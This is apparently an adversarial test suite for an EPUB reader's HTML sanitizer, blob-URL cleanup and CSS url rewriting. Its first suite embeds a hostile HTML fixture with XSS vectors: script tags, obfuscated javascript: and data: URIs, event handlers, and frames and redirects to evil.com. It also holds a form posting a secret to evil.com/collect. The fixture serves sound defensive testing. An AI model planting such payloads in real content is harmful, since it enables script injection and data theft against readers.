/**
 * .agents/teamwork/m2_r2_reviewer_2/independent_stress_test.js
 * Independent Adversarial Stress Test Suite by Reviewer 2
 * Tests Security Sandboxing, Memory Management, CSS Rewriting, and Edge Cases
 */

const fs = require('node:fs');
const path = require('node:path');
const puppeteer = require('puppeteer-core');
const { startServer } = require('../../../test/server.js');

const CHROME_PATH = process.env.CHROME_BIN || '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';

async function runAdversarialAudit() {
  console.log('====================================================================');
  console.log('   Reviewer 2 Independent Adversarial Stress & Integrity Suite      ');
  console.log('====================================================================');

  const { url: serverUrl, close: closeServer } = await startServer({ port: 0, autoPortFallback: true });
  console.log(`[stress-test] Server running at ${serverUrl}`);

  const browser = await puppeteer.launch({
    executablePath: CHROME_PATH,
    headless: 'new',
    args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
  });

  const page = await browser.newPage();

  page.on('console', msg => {
    if (msg.type() === 'error') {
      console.log(`[browser-error] ${msg.text()}`);
    }
  });

  try {
    await page.goto(`${serverUrl}/index.html`, { waitUntil: 'domcontentloaded' });

    const results = await page.evaluate(async () => {
      const suiteResults = [];

      function assert(condition, message) {
        if (!condition) throw new Error(message);
      }

      const { AssetExtractor, DOMSanitizer, resolveMimeType } = await import('/js/parser/asset-extractor.js');
      const { PathResolver, findZipEntry } = await import('/js/parser/path-resolver.js');
      const { EpubParser } = await import('/js/parser/epub-parser.js');

      // -----------------------------------------------------------------
      // SUITE 1: DOMSanitizer Adversarial Vector Stress
      // -----------------------------------------------------------------
      try {
        const hostileHtml = `
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="refresh" content="0; url=https://evil.com/redirect">
  <META HTTP-EQUIV="REFRESH" CONTENT="1; URL=https://evil.com/redirect2">
  <meta http-equiv="Refresh" content="2; url=https://evil.com/redirect3">
  <base href="https://evil.com/hijack/">
  <BASE HREF="https://evil.com/hijack2/">
  <script>window.ATTACK_1 = true;</script>
  <sCrIpT>window.ATTACK_2 = true;</sCrIpT>
  <SCRIPT type="text/javascript">window.ATTACK_3 = true;</SCRIPT>
</head>
<body onload="alert('body onload')" ONUNLOAD="alert('body onunload')">
  <!-- Frame injections -->
  <iframe src="https://evil.com/embed"></iframe>
  <IFRAME SRC="https://evil.com/embed2"></IFRAME>
  <frameset><frame src="https://evil.com/frame1"></frameset>
  <FRAME SRC="https://evil.com/frame2">
  
  <!-- Object / embed / applet -->
  <object data="https://evil.com/malware.swf"></object>
  <OBJECT DATA="https://evil.com/malware2.swf"></OBJECT>
  <embed src="https://evil.com/exploit.swf"></embed>
  <EMBED SRC="https://evil.com/exploit2.swf"></EMBED>
  <applet code="Exploit.class"></applet>
  <APPLET CODE="Exploit2.class"></APPLET>

  <!-- Event handlers with case, whitespace, custom names -->
  <div onclick="alert(1)" ONMOUSEOVER="alert(2)" OnMouseEnter="alert(3)"
       onkeydown="alert(4)" onanimationend="alert(5)" onwebkitanimationend="alert(6)"
       ontouchstart="alert(7)" onformdata="alert(8)">
    Interactive Div
  </div>
  <svg onload="alert('svg onload')">
    <circle cx="10" cy="10" r="5" onclick="alert('circle')"/>
    <a xlink:href="javascript:alert('svg-xlink')">SVG link</a>
    <image xlink:href="JAVASCRIPT:alert('svg-img-xlink')" href="javascript:alert('svg-img-href')"/>
  </svg>

  <!-- Obfuscated javascript: schemes -->
  <a id="t1" href="javascript:alert(1)">t1</a>
  <a id="t2" href="JAVASCRIPT:alert(2)">t2</a>
  <a id="t3" href="java\u0001script:alert(3)">t3</a>
  <a id="t4" href="java\t\r\n script:alert(4)">t4</a>
  <a id="t5" href="vbscript:msgbox(5)">t5</a>
  <a id="t6" href="VBSCRIPT:msgbox(6)">t6</a>
  <a id="t7" href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">t7</a>
  <a id="t8" href="DATA:TEXT/HTML,<script>alert(8)</script>">t8</a>
  <a id="t9" href="data:application/xhtml+xml,<script>alert(9)</script>">t9</a>
  <img id="img-bad" src="javascript:alert('img')">
  <video id="vid-bad" poster="javascript:alert('poster')"></video>

  <!-- Form elements and submission controls -->
  <form id="form1" action="https://evil.com/collect" method="POST" target="_blank" onsubmit="alert('submit')">
    <input type="text" name="secret" value="12345"/>
    <input id="sub1" type="submit" formaction="https://evil.com/override" formmethod="POST" formtarget="_top"/>
    <input id="sub2" type="image" formaction="https://evil.com/override2"/>
    <button id="btn1" type="submit" formaction="https://evil.com/btn" formmethod="GET" formtarget="_blank">Submit</button>
  </form>
</body>
</html>`;

        const parser = new DOMParser();
        const doc = parser.parseFromString(hostileHtml, 'text/html');
        DOMSanitizer.sanitize(doc);

        // 1. Verify scripts
        assert(doc.querySelectorAll('script').length === 0, 'Found unstripped <script> elements');
        // 2. Verify meta refresh
        assert(doc.querySelectorAll('meta[http-equiv="refresh" i]').length === 0, 'Found unstripped meta refresh');
        // 3. Verify base
        assert(doc.querySelectorAll('base').length === 0, 'Found unstripped <base>');
        // 4. Verify iframe, frame, frameset
        assert(doc.querySelectorAll('iframe').length === 0, 'Found unstripped <iframe>');
        assert(doc.querySelectorAll('frame').length === 0, 'Found unstripped <frame>');
        assert(doc.querySelectorAll('frameset').length === 0, 'Found unstripped <frameset>');
        // 5. Verify object, embed, applet
        assert(doc.querySelectorAll('object').length === 0, 'Found unstripped <object>');
        assert(doc.querySelectorAll('embed').length === 0, 'Found unstripped <embed>');
        assert(doc.querySelectorAll('applet').length === 0, 'Found unstripped <applet>');

        // 6. Verify 0 on* attributes anywhere
        const allElements = doc.querySelectorAll('*');
        for (const el of allElements) {
          for (const attr of el.attributes) {
            assert(!attr.name.toLowerCase().startsWith('on'), `Found on* handler: ${attr.name} on <${el.tagName}>`);
          }
        }

        // 7. Verify dangerous URI schemes removed
        for (const id of ['t1', 't2', 't3', 't4', 't5', 't6', 't7', 't8', 't9']) {
          const a = doc.getElementById(id);
          assert(!a.hasAttribute('href') || a.getAttribute('href') === '', `Failed to neutralize ${id}: href is "${a.getAttribute('href')}"`);
        }
        const imgBad = doc.getElementById('img-bad');
        assert(!imgBad.hasAttribute('src') || imgBad.getAttribute('src') === '', 'Failed to neutralize img src javascript:');
        const vidBad = doc.getElementById('vid-bad');
        assert(!vidBad.hasAttribute('poster') || vidBad.getAttribute('poster') === '', 'Failed to neutralize video poster javascript:');

        // 8. Verify form neutralization
        const form = doc.getElementById('form1');
        assert(!form.hasAttribute('action'), 'Form action not removed');
        assert(!form.hasAttribute('method'), 'Form method not removed');
        assert(!form.hasAttribute('target'), 'Form target not removed');
        assert(!form.hasAttribute('onsubmit'), 'Form onsubmit not removed');

        const sub1 = doc.getElementById('sub1');
        assert(!sub1.hasAttribute('formaction'), 'input formaction not removed');
        assert(!sub1.hasAttribute('formmethod'), 'input formmethod not removed');
        assert(!sub1.hasAttribute('formtarget'), 'input formtarget not removed');

        const sub2 = doc.getElementById('sub2');
        assert(!sub2.hasAttribute('formaction'), 'input type=image formaction not removed');

        const btn1 = doc.getElementById('btn1');
        assert(!btn1.hasAttribute('formaction'), 'button formaction not removed');
        assert(!btn1.hasAttribute('formmethod'), 'button formmethod not removed');
        assert(!btn1.hasAttribute('formtarget'), 'button formtarget not removed');

        // 9. Null/undefined safety
        assert(DOMSanitizer.sanitize(null) === null, 'DOMSanitizer(null) did not return null');
        assert(DOMSanitizer.sanitize(undefined) === undefined, 'DOMSanitizer(undefined) did not return undefined');

        suiteResults.push({ name: 'DOMSanitizer Adversarial Stress & Complete Sanitization', passed: true });
      } catch (err) {
        suiteResults.push({ name: 'DOMSanitizer Adversarial Stress & Complete Sanitization', passed: false, error: err.message });
      }

      // -----------------------------------------------------------------
      // SUITE 2: Memory Management & Lifecycle Revocation Integrity
      // -----------------------------------------------------------------
      try {
        const trackedCreated = new Set();
        const trackedRevoked = new Set();

        const realCreate = URL.createObjectURL;
        const realRevoke = URL.revokeObjectURL;

        URL.createObjectURL = (blob) => {
          const url = realCreate.call(URL, blob);
          trackedCreated.add(url);
          return url;
        };

        URL.revokeObjectURL = (url) => {
          trackedRevoked.add(url);
          return realRevoke.call(URL, url);
        };

        try {
          const zip = new JSZip();
          zip.file('mimetype', 'application/epub+zip', { compression: 'STORE' });
          // Create 15 assets (images, fonts, stylesheets, media)
          for (let i = 1; i <= 10; i++) {
            zip.file(`OEBPS/images/img${i}.png`, new Uint8Array([137, 80, 78, 71, i]));
          }
          zip.file('OEBPS/fonts/custom.woff2', new Uint8Array([1, 2, 3, 4]));
          zip.file('OEBPS/audio/sound.mp3', new Uint8Array([5, 6, 7, 8]));
          zip.file('OEBPS/video/clip.mp4', new Uint8Array([9, 10, 11, 12]));
          zip.file('OEBPS/styles/style1.css', `
            body { background: url("../images/img1.png"); }
            @font-face { src: url("../fonts/custom.woff2"); }
          `);
          zip.file('OEBPS/styles/style2.css', `
            h1 { background: url("../images/img2.png"); }
          `);

          const manifest = [
            { id: 'img1', href: 'images/img1.png', fullPath: 'OEBPS/images/img1.png', mediaType: 'image/png' },
            { id: 'css1', href: 'styles/style1.css', fullPath: 'OEBPS/styles/style1.css', mediaType: 'text/css' },
            { id: 'css2', href: 'styles/style2.css', fullPath: 'OEBPS/styles/style2.css', mediaType: 'text/css' },
            { id: 'fnt', href: 'fonts/custom.woff2', fullPath: 'OEBPS/fonts/custom.woff2', mediaType: 'font/woff2' }
          ];

          const extractor = new AssetExtractor(zip, manifest);

          // Extract individual assets
          for (let i = 1; i <= 10; i++) {
            const url = await extractor.extractAsset(`OEBPS/images/img${i}.png`);
            assert(url && url.startsWith('blob:'), `extractAsset failed for img${i}`);
          }
          await extractor.extractAsset('OEBPS/audio/sound.mp3');
          await extractor.extractAsset('OEBPS/video/clip.mp4');

          // Process stylesheets
          const css1Url = await extractor.processStylesheet('OEBPS/styles/style1.css');
          const css2Url = await extractor.processStylesheet('OEBPS/styles/style2.css');
          assert(css1Url && css1Url.startsWith('blob:'), 'css1Url failed');
          assert(css2Url && css2Url.startsWith('blob:'), 'css2Url failed');

          // Verify all created URLs are tracked in extractor.blobUrls
          assert(extractor.blobUrls.size === trackedCreated.size, `blobUrls count mismatch: extractor has ${extractor.blobUrls.size}, tracked has ${trackedCreated.size}`);
          for (const url of extractor.blobUrls) {
            assert(trackedCreated.has(url), `Untracked blob URL: ${url}`);
          }

          // Initial cleanup call
          extractor.cleanup();

          // Assert 100% of created URLs were revoked
          assert(trackedRevoked.size === trackedCreated.size, `Revocation mismatch: created ${trackedCreated.size}, revoked ${trackedRevoked.size}`);
          for (const url of trackedCreated) {
            assert(trackedRevoked.has(url), `URL was not revoked: ${url}`);
          }

          // Assert state after cleanup
          assert(extractor.assetMap.size === 0, 'assetMap not cleared');
          assert(extractor.blobUrls.size === 0, 'blobUrls not cleared');
          assert(extractor.manifestByPath.size === 0, 'manifestByPath not cleared');
          assert(extractor.isCleanedUp === true, 'isCleanedUp not set to true');

          // Repeated cleanup calls must be safe and idempotent
          for (let i = 0; i < 5; i++) {
            extractor.cleanup();
          }

          // Subsequent operations must not leak or crash
          const postCleanAsset = await extractor.extractAsset('OEBPS/images/img1.png');
          assert(postCleanAsset === null, 'extractAsset after cleanup must return null');
          const postCleanCss = await extractor.processStylesheet('OEBPS/styles/style1.css');
          assert(postCleanCss === null, 'processStylesheet after cleanup must return null');

          let chapterThrew = false;
          try {
            await extractor.getChapterDocument('OEBPS/text/ch1.xhtml');
          } catch (e) {
            chapterThrew = true;
            assert(e.message.includes('cleaned up'), `Unexpected chapter error: ${e.message}`);
          }
          assert(chapterThrew, 'getChapterDocument after cleanup should throw descriptive error');

          suiteResults.push({ name: 'Memory Management 100% Revocation & Post-Cleanup Idempotency', passed: true });
        } finally {
          URL.createObjectURL = realCreate;
          URL.revokeObjectURL = realRevoke;
        }
      } catch (err) {
        suiteResults.push({ name: 'Memory Management 100% Revocation & Post-Cleanup Idempotency', passed: false, error: err.message });
      }

      // -----------------------------------------------------------------
      // SUITE 3: CSS URL Rewriting, Complex Relative Paths, Cycles & Comments
      // -----------------------------------------------------------------
      try {
        const zip = new JSZip();
        zip.file('mimetype', 'application/epub+zip', { compression: 'STORE' });
        zip.file('OEBPS/assets/img/hero.png', new Uint8Array([1, 2, 3]));
        zip.file('OEBPS/assets/img/icon.svg', '<svg xmlns="http://www.w3.org/2000/svg" id="star"></svg>');
        zip.file('OEBPS/fonts/sub/roboto.woff2', new Uint8Array([4, 5, 6]));

        // Multi-file cycle: c1 -> c2 -> c3 -> c1
        zip.file('OEBPS/css/c1.css', `@import "c2.css";\n.c1 { color: red; }`);
        zip.file('OEBPS/css/c2.css', `@import "c3.css";\n.c2 { color: green; }`);
        zip.file('OEBPS/css/c3.css', `@import "c1.css";\n.c3 { color: blue; }`);

        // Self-cycle
        zip.file('OEBPS/css/self.css', `@import "self.css";\n.self { color: purple; }`);

        const extractor = new AssetExtractor(zip);

        // Test cycle 1: 3-file cycle
        const c1Rewritten = await extractor.rewriteCss(`@import "c2.css";\nbody { margin: 0; }`, 'OEBPS/css/c1.css');
        assert(c1Rewritten.includes('/* Circular @import omitted */'), '3-way circular import not detected');
        assert(c1Rewritten.includes('.c2 { color: green; }'), 'c2 content missing from inlined import');
        assert(c1Rewritten.includes('.c3 { color: blue; }'), 'c3 content missing from inlined import');

        // Test cycle 2: Self cycle
        const selfRewritten = await extractor.rewriteCss(`@import "self.css";`, 'OEBPS/css/self.css');
        assert(selfRewritten.includes('/* Circular @import omitted */'), 'Self circular import not detected');

        // Test complex relative paths, comments, duplicates, whitespace
        const complexCss = `
/* Comment 1 with @import "fake.css"; and url("../assets/fake.png") */
@font-face {
  font-family: 'Roboto';
  src: url(  '../fonts/sub/roboto.woff2'  ) format('woff2');
}
.hero {
  background-image: url("../assets/img/hero.png");
}
.hero-dup {
  /* Repeated exact url */
  background: url("../assets/img/hero.png") no-repeat center;
}
.hero-complex {
  /* Complex dot segments */
  background: url("../../OEBPS/assets/./img/../img/hero.png");
}
.vector {
  mask-image: url('../assets/img/icon.svg#star');
}
.external {
  background: url("https://example.com/cdn/bg.jpg");
  data: url("data:image/png;base64,iVBORw0KGgo=");
  filter: url(#internal-filter);
}
/* Comment 2 at end */
`;

        const rewrittenComplex = await extractor.rewriteCss(complexCss, 'OEBPS/css/page.css');

        // Comments must be preserved verbatim
        assert(rewrittenComplex.includes('/* Comment 1 with @import "fake.css"; and url("../assets/fake.png") */'), 'Comment 1 corrupted');
        assert(rewrittenComplex.includes('/* Comment 2 at end */'), 'Comment 2 corrupted');

        // External URLs, data URIs, SVG local hashes must be preserved
        assert(rewrittenComplex.includes('url("https://example.com/cdn/bg.jpg")'), 'External URL altered');
        assert(rewrittenComplex.includes('url("data:image/png;base64,iVBORw0KGgo=")'), 'Data URI altered');
        assert(rewrittenComplex.includes('url(#internal-filter)'), 'Local SVG hash filter altered');

        // Check rewritten assets
        const heroBlob = extractor.assetMap.get('OEBPS/assets/img/hero.png');
        assert(heroBlob && heroBlob.startsWith('blob:'), 'hero.png not in assetMap');

        const fontBlob = extractor.assetMap.get('OEBPS/fonts/sub/roboto.woff2');
        assert(fontBlob && fontBlob.startsWith('blob:'), 'roboto.woff2 not in assetMap');

        const svgBlob = extractor.assetMap.get('OEBPS/assets/img/icon.svg');
        assert(svgBlob && svgBlob.startsWith('blob:'), 'icon.svg not in assetMap');

        // Check that font was rewritten
        assert(rewrittenComplex.includes(`url("${fontBlob}")`), 'Font URL with whitespace not rewritten');

        // Check that SVG with fragment was rewritten
        assert(rewrittenComplex.includes(`url("${svgBlob}#star")`), 'SVG fragment URL not rewritten');

        // Check that all 3 instances of hero.png were rewritten to blob URL
        const heroMatches = rewrittenComplex.match(new RegExp(heroBlob.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'));
        assert(heroMatches && heroMatches.length === 3, `Expected 3 occurrences of hero blob URL, found: ${heroMatches ? heroMatches.length : 0}`);

        extractor.cleanup();
        suiteResults.push({ name: 'CSS URL Rewriting Complex Paths, Cycles & Comment Protection', passed: true });
      } catch (err) {
        suiteResults.push({ name: 'CSS URL Rewriting Complex Paths, Cycles & Comment Protection', passed: false, error: err.message });
      }

      // -----------------------------------------------------------------
      // SUITE 4: Full Chapter DOM Preparation & Asset Rewriting Integration
      // -----------------------------------------------------------------
      try {
        const zip = new JSZip();
        zip.file('mimetype', 'application/epub+zip', { compression: 'STORE' });
        zip.file('OEBPS/img/photo.jpg', new Uint8Array([255, 216, 255, 224]));
        zip.file('OEBPS/img/retina.jpg', new Uint8Array([255, 216, 255, 225]));
        zip.file('OEBPS/audio/narration.mp3', new Uint8Array([1, 2, 3]));
        zip.file('OEBPS/video/movie.mp4', new Uint8Array([4, 5, 6]));
        zip.file('OEBPS/video/thumb.png', new Uint8Array([7, 8, 9]));
        zip.file('OEBPS/css/chapter.css', `
          .lead { background: url("../img/photo.jpg"); }
        `);

        zip.file('OEBPS/text/ch01.xhtml', `<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
  <title>Chapter 1</title>
  <link rel="stylesheet" href="../css/chapter.css"/>
  <style>
    .inline-test { background-image: url("../img/photo.jpg"); }
  </style>
</head>
<body>
  <h1>Chapter 1</h1>
  <img id="img1" src="../img/photo.jpg" srcset="../img/photo.jpg 1x, ../img/retina.jpg 2x" alt="Hero"/>
  <svg width="100" height="100">
    <image id="svg-img" href="../img/photo.jpg" xlink:href="../img/photo.jpg"/>
  </svg>
  <video id="vid" src="../video/movie.mp4" poster="../video/thumb.png">
    <source src="../video/movie.mp4" type="video/mp4"/>
  </video>
  <audio id="aud" src="../audio/narration.mp3"></audio>
  <div id="styled-div" style="background: url('../img/photo.jpg');">Styled Content</div>
  
  <!-- Links -->
  <a id="ext-link" href="https://example.com/docs">External Docs</a>
  <a id="internal-anchor" href="#section-2">Jump to Section 2</a>
  <a id="cross-chapter" href="ch02.xhtml#part-b">Jump to Chapter 2</a>
</body>
</html>`);

        const extractor = new AssetExtractor(zip);
        const doc = await extractor.getChapterDocument('OEBPS/text/ch01.xhtml');

        // 1. Check stylesheet
        const link = doc.querySelector('link[rel~="stylesheet"]');
        assert(link && link.getAttribute('href').startsWith('blob:'), 'Stylesheet link not rewritten');

        // 2. Check inline <style>
        const inlineStyle = doc.querySelector('style');
        assert(inlineStyle.textContent.includes('blob:'), 'Inline style url() not rewritten');

        // 3. Check inline style="" attribute
        const styledDiv = doc.getElementById('styled-div');
        assert(styledDiv.getAttribute('style').includes('blob:'), 'style="" attribute not rewritten');

        // 4. Check img src and srcset
        const img1 = doc.getElementById('img1');
        assert(img1.getAttribute('src').startsWith('blob:'), 'img src not rewritten');
        const srcset = img1.getAttribute('srcset');
        assert(srcset.includes('blob:') && srcset.includes('1x') && srcset.includes('2x'), 'img srcset not rewritten properly: ' + srcset);

        // 5. Check SVG image
        const svgImg = doc.getElementById('svg-img');
        assert(svgImg.getAttribute('href').startsWith('blob:'), 'SVG image href not rewritten');
        assert(svgImg.getAttribute('xlink:href').startsWith('blob:'), 'SVG image xlink:href not rewritten');

        // 6. Check video and poster
        const vid = doc.getElementById('vid');
        assert(vid.getAttribute('src').startsWith('blob:'), 'video src not rewritten');
        assert(vid.getAttribute('poster').startsWith('blob:'), 'video poster not rewritten');
        const source = vid.querySelector('source');
        assert(source.getAttribute('src').startsWith('blob:'), 'video source src not rewritten');

        // 7. Check audio
        const aud = doc.getElementById('aud');
        assert(aud.getAttribute('src').startsWith('blob:'), 'audio src not rewritten');

        // 8. Check links
        const extLink = doc.getElementById('ext-link');
        assert(extLink.getAttribute('target') === '_blank', 'External link target != _blank');
        assert(extLink.getAttribute('rel') === 'noopener noreferrer', 'External link rel != noopener noreferrer');

        const intAnchor = doc.getElementById('internal-anchor');
        assert(intAnchor.getAttribute('data-internal-anchor') === 'section-2', 'Internal anchor attribute missing');

        const crossCh = doc.getElementById('cross-chapter');
        assert(crossCh.getAttribute('data-chapter-link') === 'true', 'Cross chapter data-chapter-link missing');
        assert(crossCh.getAttribute('data-epub-href') === 'OEBPS/text/ch02.xhtml', 'data-epub-href mismatch');
        assert(crossCh.getAttribute('data-epub-hash') === 'part-b', 'data-epub-hash mismatch');
        assert(crossCh.getAttribute('href').startsWith('#reader-jump:'), 'Neutralized href mismatch');

        extractor.cleanup();
        suiteResults.push({ name: 'Full Chapter DOM Preparation & Asset Rewriting Integration', passed: true });
      } catch (err) {
        suiteResults.push({ name: 'Full Chapter DOM Preparation & Asset Rewriting Integration', passed: false, error: err.message });
      }

      return suiteResults;
    });

    console.log('\n--- Independent Adversarial Test Results ---');
    let allPassed = true;
    for (const r of results) {
      const mark = r.passed ? '✅ PASS' : '❌ FAIL';
      console.log(`  ${mark}: ${r.name}${r.error ? ' (ERROR: ' + r.error + ')' : ''}`);
      if (!r.passed) allPassed = false;
    }

    if (!allPassed) {
      process.exitCode = 1;
    }
  } finally {
    await browser.close();
    await closeServer();
  }
}

runAdversarialAudit().catch(err => {
  console.error('Fatal execution error:', err);
  process.exit(1);
});
